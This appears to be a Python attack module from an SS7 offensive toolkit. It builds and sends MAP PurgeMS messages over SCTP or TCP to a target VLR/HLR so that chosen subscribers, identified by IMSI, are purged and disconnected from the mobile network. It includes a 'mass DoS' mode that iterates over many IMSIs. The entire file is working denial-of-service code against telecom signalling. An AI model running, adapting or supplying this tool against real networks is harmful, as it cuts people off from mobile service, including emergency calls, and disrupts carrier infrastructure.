#!/usr/bin/env python
"""
PurgeMS DoS Attack Module
Disconnects subscriber from network by purging from VLR.
Supports both SCTP (raw) and TCP transport.
"""
import sys
import os
from scapy.all import *

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from ss7.attacks.ss7_layers import *
from ss7.attacks.map_layer import PurgeMS

def purge_main():
    print("\n" + "=" * 50)
    print(" PurgeMS DoS Attack")
    print(" Disconnect Subscriber from Network")
    print("=" * 50 + "\n")
    
    print("\033[31m[!] WARNING: This will take target OFFLINE!\033[0m")
    print("\033[31m[!] Target loses all mobile connectivity.\033[0m\n")

    print("[1] Connection Configuration")
    print("-" * 30)
    remote_ip = get_input("Target VLR/HLR IP", "10.0.0.1", validator=validate_ip)
    remote_port = int(get_input("Target Port", "2905"))
    
    print("\n[2] SS7 Configuration")
    print("-" * 30)
    opc = int(get_input("Your Point Code (OPC)", "666"))
    dpc = int(get_input("Target Point Code (DPC)", "2"))
    
    print("\n[3] Attack Parameters")
    print("-" * 30)
    target_imsi = get_input("Target IMSI", "286011234567890", validator=validate_imsi)
    vlr_number = get_input("VLR Number", "44123456789")
    
    mass = get_input("Mass DoS? (Send to multiple IMSIs) [y/N]", "n")
    
    targets = [target_imsi]
    if mass.lower() == 'y':
        count = int(get_input("How many targets?", "10"))
        try:
            base_imsi = int(target_imsi)
            targets = [str(base_imsi + i) for i in range(count)]
        except ValueError:
            print("[-] IMSI must be numeric for mass attack. Using single target.")
        print(f"[+] Will attack {len(targets)} IMSIs")

    # Transport selection
    print("\n[+] Transport Selection:")
    print("    1) SCTP (raw - requires root/Linux)")
    print("    2) TCP  (works everywhere)")
    transport = get_input("Transport mode", "2")
    
    print("\n" + "=" * 50)
    print(" Executing PurgeMS Attack")
    print("=" * 50)
    
    success_count = 0
    
    for imsi in targets:
        print(f"\n[>] Target: {imsi}")
        
        purge = PurgeMS(imsi, vlr_number)
        tcap_data = purge.to_tcap_begin()
        
        if transport == "1":
            ok = _sctp_purge(remote_ip, remote_port, opc, dpc, tcap_data)
        else:
            ok = _tcp_purge(remote_ip, remote_port, opc, dpc, tcap_data)
        
        if ok:
            success_count += 1
    
    print("\n" + "=" * 50)
    print(f" Attack Complete: {success_count}/{len(targets)} successful")
    print("=" * 50)
    
    input("\nPress Enter to return...")


def _sctp_purge(remote_ip, remote_port, opc, dpc, tcap_data):
    """SCTP transport. Returns True on success."""
    try:
        init_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / SCTPChunkInit()
        ans = sr1(init_pkt, timeout=3, verbose=0)
        
        if ans and ans.haslayer(SCTPChunkInitAck):
            m3ua = M3UA(msg_class=1, msg_type=1)
            proto_data = M3UA_Param_Protocol_Data(opc=opc, dpc=dpc, si=3, ni=2)
            data_pkt = IP(dst=remote_ip) / SCTP(sport=2905, dport=remote_port) / \
                       SCTPChunkData(data=bytes(m3ua/proto_data) + tcap_data)
            map_ans = sr1(data_pkt, timeout=3, verbose=0)
            if map_ans:
                print(f"    [+] PurgeMS sent, response received")
                return True
            else:
                print("    [-] No response.")
                return False
        else:
            print("    [-] SCTP failed, using TCP...")
            return _tcp_purge(remote_ip, remote_port, opc, dpc, tcap_data)
    except Exception as e:
        print(f"    [-] SCTP Error: {e}")
        return _tcp_purge(remote_ip, remote_port, opc, dpc, tcap_data)


def _tcp_purge(remote_ip, remote_port, opc, dpc, tcap_data):
    """TCP transport fallback. Returns True on success."""
    try:
        from ss7.attacks.tcp_transport import tcp_attack
    except ImportError:
        sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
        from tcp_transport import tcp_attack

    result = tcp_attack(remote_ip, remote_port, opc, dpc, tcap_data, called_ssn=7)
    if result.get('success'):
        print(f"    \033[32m[+] PurgeMS sent via TCP!\033[0m")
        return True
    else:
        print(f"    \033[31m[-] {result.get('error', 'Failed')}\033[0m")
        return False


if __name__ == "__main__":
    purge_main()
